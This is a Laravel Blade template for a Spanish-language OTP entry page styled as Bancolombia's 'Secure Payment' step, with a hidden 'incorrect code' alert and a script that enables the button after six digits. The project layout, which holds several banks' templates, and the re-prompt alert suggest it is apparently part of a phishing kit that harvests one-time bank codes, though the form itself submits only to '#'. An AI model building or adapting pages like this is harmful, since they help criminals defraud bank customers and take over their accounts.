@extends('banks.bancolombia.layout')

@section('title', 'Secure Payment')

@section('page_title', 'Ingresa el codigo otp que llego a tu celular')


@section('alert')
    <div class="alert-container" style="display:none" id="alertBox">
        <div class="alert">
            <div class="alert-icon">
                <i class="fa-solid fa-circle-xmark"></i>
            </div>
            <div class="alert-text" id="alertText">
                Codigo otp incorrecto. Verifica e intenta nuevamente.
            </div>
            <div class="alert-close" onclick="document.getElementById('alertBox').style.display='none'">
                <i class="fa-solid fa-x"></i>
            </div>
        </div>
    </div>
@endsection

@section('content')
    <br>
    <br>
    <form method="POST" action="#">
        @csrf
        <div class="input-container">
            <img class="input-icon" src="{{asset('assets/img/payment/bancolombia/passicon.png')}}">
            <input type="tel" name="code" id="txtOtp" class="pass" placeholder maxlength="6" minlength="6"
                oninput="this.value = this.value.replace(/\D+/g, '');" inputmode="numeric" pattern="[0-9]{6}" required>
            <label for="txtOtp">Codigo OTP</label>
        </div>

        <a><small>¿necesitas ayuda?</small></a>

        <br>

        <div>
            <input type="submit" value="Continuar" id="btnOtp" disabled>
        </div>
    </form>
@endsection

@push('scripts')
    <script>
        // Ejemplo: habilitar botón cuando el input sea válido (4 dígitos)
        const otp = document.getElementById('txtOtp');
        const btn = document.getElementById('btnOtp');

        function toggleBtn() {
            btn.disabled = !(otp.value && otp.value.length === 6);
        }

        otp.addEventListener('input', toggleBtn);
        toggleBtn();
    </script>
@endpush